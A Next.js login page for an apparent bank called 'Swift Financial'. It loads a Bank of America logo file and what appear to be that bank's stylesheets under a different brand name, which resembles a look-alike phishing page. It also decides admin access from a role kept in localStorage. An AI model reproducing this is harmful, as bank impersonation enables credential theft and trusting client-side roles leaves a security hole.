'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import Image from 'next/image';

export default function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const router = useRouter();

  // Session check - redirect if already logged in
  useEffect(() => {
    const userEmail = localStorage.getItem('userEmail');
    const userRole = localStorage.getItem('userRole');
    
    if (userEmail && userRole) {
      if (userRole === 'admin' || userRole === 'superadmin') {
        router.push('/admin');
      } else {
        router.push('/dashboard');
      }
    }
  }, [router]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });

      const data = await res.json();

      if (res.ok) {
        const role = data.role || 'user';
        localStorage.setItem('userEmail', email);
        localStorage.setItem('userRole', role);
        
        if (role === 'admin' || role === 'superadmin') {
          router.push('/admin');
        } else {
          router.push('/dashboard');
        }
      } else {
        setError(data.message || 'Login failed');
      }
    } catch (error) {
      setError('Network error. Please try again.');
    }
    
    setLoading(false);
  };

  return (
    <>
      <link rel="stylesheet" type="text/css" href="/assets/vipaa-v4-jawr.css" media="all" />
      <link type="text/css" rel="stylesheet" href="/assets/styles-67459201e251b94c0aa0.m.css" />
      <style jsx global>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        html, body {
          height: 100%;
          overflow-x: hidden;
          padding-bottom: 0 !important;
        }
        @media (max-width: 768px) {
          .header-nav {
            display: none !important;
          }
        }
      `}</style>
      
      <div style={{ 
        height: '100vh', 
        backgroundImage: 'url(/assets/login_bg13.jpg)',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat',
        position: 'relative',
        display: 'flex',
        flexDirection: 'column'
      }}>
        <div style={{
          position: 'absolute',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0, 0, 0, 0.6)',
          zIndex: 1
        }}></div>

        {/* Header */}
        <header style={{
          background: 'rgba(255, 255, 255, 0.95)',
          backdropFilter: 'blur(10px)',
          boxShadow: '0 2px 4px rgba(0,0,0,0.1)',
          padding: '12px 0',
          position: 'relative',
          zIndex: 2
        }}>
          <div style={{
            maxWidth: '1280px',
            margin: '0 auto',
            padding: '0 24px',
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center'
          }}>
            <Link href="/">
              <Image src="/assets/BofA_rgb.png" alt="Swift Financial" width={200} height={24} style={{ cursor: 'pointer' }} />
            </Link>
            <nav className="header-nav" style={{ display: 'flex', alignItems: 'center', gap: '32px' }}>
              <Link href="#" style={{ fontSize: '14px', color: '#333', textDecoration: 'none' }}>Personal</Link>
              <Link href="#" style={{ fontSize: '14px', color: '#333', textDecoration: 'none' }}>Business</Link>
              <Link href="#" style={{ fontSize: '14px', color: '#333', textDecoration: 'none' }}>Investing</Link>
              <Link href="#" style={{ fontSize: '14px', color: '#333', textDecoration: 'none' }}>Support</Link>
            </nav>
          </div>
        </header>

        {/* Login form */}
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          flex: 1,
          padding: '40px 20px',
          position: 'relative',
          zIndex: 2
        }}>
          <div style={{
            backgroundColor: '#fff',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
            padding: '40px',
            width: '100%',
            maxWidth: '400px'
          }}>
            <div style={{ textAlign: 'center', marginBottom: '30px' }}>
              <h1 style={{
                fontSize: '24px',
                fontWeight: '600',
                color: '#333',
                marginBottom: '8px'
              }}>
                Welcome
              </h1>
              <p style={{ color: '#666', fontSize: '14px' }}>
                Access your Swift Financial account
              </p>
            </div>

            <form onSubmit={handleSubmit}>
              <div style={{ marginBottom: '20px' }}>
                <label style={{
                  display: 'block',
                  marginBottom: '6px',
                  fontSize: '14px',
                  fontWeight: '500',
                  color: '#333'
                }}>
                  Email
                </label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  style={{
                    width: '100%',
                    padding: '12px',
                    border: '1px solid #ddd',
                    borderRadius: '4px',
                    fontSize: '14px',
                    outline: 'none',
                    boxSizing: 'border-box'
                  }}
                  onFocus={(e) => e.target.style.borderColor = '#0073cf'}
                  onBlur={(e) => e.target.style.borderColor = '#ddd'}
                />
              </div>

              <div style={{ marginBottom: '20px' }}>
                <label style={{
                  display: 'block',
                  marginBottom: '6px',
                  fontSize: '14px',
                  fontWeight: '500',
                  color: '#333'
                }}>
                  Password
                </label>
                <div style={{ position: 'relative' }}>
                  <input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    style={{
                      width: '100%',
                      padding: '12px 40px 12px 12px',
                      border: '1px solid #ddd',
                      borderRadius: '4px',
                      fontSize: '14px',
                      outline: 'none',
                      boxSizing: 'border-box'
                    }}
                    onFocus={(e) => e.target.style.borderColor = '#0073cf'}
                    onBlur={(e) => e.target.style.borderColor = '#ddd'}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    style={{
                      position: 'absolute',
                      right: '12px',
                      top: '50%',
                      transform: 'translateY(-50%)',
                      background: 'none',
                      border: 'none',
                      cursor: 'pointer',
                      color: '#666',
                      padding: '0',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center'
                    }}
                  >
                    {showPassword ? (
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                        <path d="M1 1l22 22" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    ) : (
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                        <circle cx="12" cy="12" r="3" stroke="currentColor" strokeWidth="2"/>
                      </svg>
                    )}
                  </button>
                </div>
              </div>

              <div style={{ marginBottom: '20px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <input
                    type="checkbox"
                    id="remember"
                    style={{
                      width: '16px',
                      height: '16px',
                      accentColor: '#0073cf'
                    }}
                  />
                  <label
                    htmlFor="remember"
                    style={{
                      fontSize: '14px',
                      color: '#374151',
                      cursor: 'pointer'
                    }}
                  >
                    Remember me
                  </label>
                </div>
              </div>

              {error && (
                <div style={{
                  backgroundColor: '#f8d7da',
                  color: '#721c24',
                  padding: '12px',
                  borderRadius: '4px',
                  marginBottom: '20px',
                  fontSize: '14px',
                  border: '1px solid #f5c6cb'
                }}>
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                style={{
                  width: '100%',
                  backgroundColor: loading ? '#ccc' : '#0073cf',
                  color: '#fff',
                  padding: '14px',
                  border: 'none',
                  borderRadius: '4px',
                  fontSize: '16px',
                  fontWeight: '600',
                  cursor: loading ? 'not-allowed' : 'pointer'
                }}
              >
                {loading ? 'Signing in...' : 'Sign In'}
              </button>
            </form>

            <div style={{
              textAlign: 'center',
              marginTop: '20px',
              paddingTop: '20px',
              borderTop: '1px solid #eee'
            }}>
              <Link href="#" style={{
                color: '#0073cf',
                textDecoration: 'none',
                fontSize: '14px'
              }}>
                Forgot your password?
              </Link>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer style={{
          backgroundColor: 'rgba(255, 255, 255, 0.95)',
          backdropFilter: 'blur(10px)',
          borderTop: '1px solid rgba(238, 238, 238, 0.5)',
          padding: '20px 0',
          textAlign: 'center',
          position: 'relative',
          zIndex: 2,
          marginTop: 'auto'
        }}>
          <div style={{
            maxWidth: '1280px',
            margin: '0 auto',
            padding: '0 24px'
          }}>
            <p style={{
              fontSize: '12px',
              color: '#666',
              margin: '0 0 10px 0'
            }}>
              © 2025 Swift Financial Corporation. All rights reserved. Member FDIC.
            </p>
            <div style={{ display: 'flex', justifyContent: 'center', gap: '20px' }}>
              <Link href="#" style={{ fontSize: '12px', color: '#666', textDecoration: 'none' }}>Privacy</Link>
              <Link href="#" style={{ fontSize: '12px', color: '#666', textDecoration: 'none' }}>Security</Link>
              <Link href="#" style={{ fontSize: '12px', color: '#666', textDecoration: 'none' }}>Terms</Link>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
}